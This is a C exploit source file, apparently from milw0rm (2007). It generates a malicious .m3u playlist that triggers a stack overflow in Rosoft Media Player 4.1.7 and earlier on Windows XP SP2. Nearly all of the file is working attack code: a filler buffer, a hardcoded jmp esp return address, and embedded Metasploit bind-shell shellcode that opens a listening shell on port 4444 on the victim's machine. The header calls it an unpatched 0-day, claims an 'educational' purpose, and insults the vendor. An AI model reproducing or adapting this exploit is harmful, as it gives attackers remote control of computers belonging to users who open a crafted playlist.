/* rosoft-player-expl.c: 2007-12-18:
 *
 * Copyright (c) 2007 devcode
 *
 *
 *          ^^ D E V C O D E ^^
 *
 * Rosoft Media Player <= 4.1.7 .M3U Stack Overflow
 * [0-DAY]
 *
 *
 * Description:
 *    A stack overflow occurs when parsing an .m3u file
 *    which does not contain any delimiters.
 *
 * Hotfix/Patch:
 *    None.
 *
 * Vulnerable systems:
 *    Rosoft Media Player <= 4.1.7
 *
 * Tested on:
 *    Rosoft Media Player 4.1.7
 *
 *    This is a PoC and was created for educational purposes only. The
 *    author is not held responsible if this PoC does not work or is
 *    used for any other purposes than the one stated above.
 *
 * Notes:
 *    Nothing much here, except the player itself is a piece of shit.
 *    The vulnerability was found by Juan Pablo Lopez Yacubian
 *    (jplopezy_at_gmail.com). Come to think of it, the entire suite
 *    of products offered by Rosoft Engineering sucks bawls.
 *
 */
#include <stdlib.h>
#include <stdio.h>

/**
 * Invalid chars: 0x1A 0xA 0xD 0x00
 * win32_bind -
 * EXITFUNC=thread LPORT=4444 Size=344 Encoder=PexFnstenvSub
 * http://metasploit.com
 */
unsigned char uszShellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x60"
    "\x90\xf0\xf7\x83\xeb\xfc\xe2\xf4\x9c\xfa\x1b\xba\x88\x69\x0f\x08"
    "\x9f\xf0\x7b\x9b\x44\xb4\x7b\xb2\x5c\x1b\x8c\xf2\x18\x91\x1f\x7c"
    "\x2f\x88\x7b\xa8\x40\x91\x1b\xbe\xeb\xa4\x7b\xf6\x8e\xa1\x30\x6e"
    "\xcc\x14\x30\x83\x67\x51\x3a\xfa\x61\x52\x1b\x03\x5b\xc4\xd4\xdf"
    "\x15\x75\x7b\xa8\x44\x91\x1b\x91\xeb\x9c\xbb\x7c\x3f\x8c\xf1\x1c"
    "\x63\xbc\x7b\x7e\x0c\xb4\xec\x96\xa3\xa1\x2b\x93\xeb\xd3\xc0\x7c"
    "\x20\x9c\x7b\x87\x7c\x3d\x7b\xb7\x68\xce\x98\x79\x2e\x9e\x1c\xa7"
    "\x9f\x46\x96\xa4\x06\xf8\xc3\xc5\x08\xe7\x83\xc5\x3f\xc4\x0f\x27"
    "\x08\x5b\x1d\x0b\x5b\xc0\x0f\x21\x3f\x19\x15\x91\xe1\x7d\xf8\xf5"
    "\x35\xfa\xf2\x08\xb0\xf8\x29\xfe\x95\x3d\xa7\x08\xb6\xc3\xa3\xa4"
    "\x33\xc3\xb3\xa4\x23\xc3\x0f\x27\x06\xf8\xe1\xab\x06\xc3\x79\x16"
    "\xf5\xf8\x54\xed\x10\x57\xa7\x08\xb6\xfa\xe0\xa6\x35\x6f\x20\x9f"
    "\xc4\x3d\xde\x1e\x37\x6f\x26\xa4\x35\x6f\x20\x9f\x85\xd9\x76\xbe"
    "\x37\x6f\x26\xa7\x34\xc4\xa5\x08\xb0\x03\x98\x10\x19\x56\x89\xa0"
    "\x9f\x46\xa5\x08\xb0\xf6\x9a\x93\x06\xf8\x93\x9a\xe9\x75\x9a\xa7"
    "\x39\xb9\x3c\x7e\x87\xfa\xb4\x7e\x82\xa1\x30\x04\xca\x6e\xb2\xda"
    "\x9e\xd2\xdc\x64\xed\xea\xc8\x5c\xcb\x3b\x98\x85\x9e\x23\xe6\x08"
    "\x15\xd4\x0f\x21\x3b\xc7\xa2\xa6\x31\xc1\x9a\xf6\x31\xc1\xa5\xa6"
    "\x9f\x40\x98\x5a\xb9\x95\x3e\xa4\x9f\x46\x9a\x08\x9f\xa7\x0f\x27"
    "\xeb\xc7\x0c\x74\xa4\xf4\x0f\x21\x32\x6f\x20\x9f\x8f\x5e\x10\x97"
    "\x33\x6f\x26\x08\xb0\x90\xf0\xf7";

int main( int argc, char **argv ) {
    FILE *f = NULL;
    char *p = NULL;

    printf( "\n\tRosoft Media Player <= 4.1.7 .M3U Stack Overflow\n\n" );
    printf( "\t\tCopyright (c) 2007 devcode\n\n\n" );

    if ( argc < 2 ) {
        printf( "Usage: %s <file>\n", argv[0] );
        return -1;
    }
   
    f = fopen( argv[1], "w+" );
    if ( !f ) {
        printf( "[-] Unable to create m3u file.\n" );
        return -1;
    }

    p = (char *)malloc( 5000 );
    memset( p, 0x41, 5000 );

    /**
     * We need a valid address here that contains
     * a value of 0 and is writable, and of course,
     * no 0x00s in the address itself. Try 0x1270FE0 
     * if 0x7FFDFFF0 doesn't work.
     */
    memcpy( p+4096, "\xF0\xFF\xFD\x7F", 4 );

    /**
     * Windows XP SP2 Pro - jmp esp (0x7C941EED, ntdll.dll)
     */
    memcpy( p+4104, "\xED\x1E\x94\x7C", 4 );
    memcpy( p+4108, uszShellcode, sizeof( uszShellcode ) );

    /**
     * Cleanup
     */
    fputs( p, f );
    fclose( f );
    free( p );

    printf( "[*] File generated succesfully!\n" );
    return 0;
}

// milw0rm.com [2007-12-18]